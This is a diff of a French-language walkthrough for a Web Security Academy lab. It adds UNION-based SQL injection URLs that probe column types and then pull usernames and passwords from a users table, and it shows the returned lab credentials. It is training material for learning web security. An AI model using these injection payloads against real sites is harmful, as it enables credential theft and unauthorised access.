@@ -19,5 +19,23 @@ https://0a1f005004cefab4c0b9415b002200c1.web-security-academy.net/filter?categor
 Plus d'internal server error à partir du 2nd NULL, vérifions dorénavant la compatibilité de chaque colonne :
 
 https://0a1f005004cefab4c0b9415b002200c1.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories'UNION SELECT 'a',NULL--
+https://0a1f005004cefab4c0b9415b002200c1.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories'UNION SELECT NULL,'a'--
+Les deux colonnes sont compatibles.
 
-Les deux étant compatibles, on sait grâce à l'énoncé que l'user à trouver est 'administrator'
+
+Tentons maintenant de récupérer le mot de passe de l'administrateur.
+
+https://0a1f005004cefab4c0b9415b002200c1.web-security-academy.net/filter?category=Gifts'UNION SELECT username,password FROM users--
+
+
+Les informations suivantes sont renvoyées par le serveur :
+
+carlos
+l8q5jyynnulbl6stuooi
+administrator
+1rlwh1lvm4ytp0yubqhe
+wiener
+8rwfk6bndgcunvflzlnw
+
+Il suffit maintenant de se connecter avec le mot de passe de l'administrateur pour terminer le lab.
+
